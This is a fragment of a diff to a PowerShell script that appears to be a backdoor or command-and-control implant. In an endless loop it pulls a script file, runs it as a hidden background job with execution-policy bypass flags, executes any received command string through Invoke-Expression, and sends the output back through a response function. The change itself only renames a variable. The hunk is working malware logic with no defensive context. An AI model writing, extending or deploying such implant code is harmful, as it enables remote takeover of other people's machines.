@@ -58,14 +58,14 @@ while ($true) {
         Remove-Item 'txt.ps1'
         pull_file
     }
-    elseif ($rawtxt -eq "filex") {
+    elseif ($cmd -eq "filex") {
         Remove-Item 'txt.ps1'
         pull_file
         Start-Job -ScriptBlock {powershell.exe -NoE -Nop -NonI -ExecutionPolicy Bypass -File '.\txt.ps1'}
         Remove-Item 'txt.ps1'
     }
-    elseif ($rawtxt.length -ne 0) {
-        $response = (iex "$rawtxt") | Out-String
+    elseif ($cmd.length -ne 0) {
+        $response = (iex "$cmd") | Out-String
         if ($response.Length -gt 0) {
             send_response $response
         }
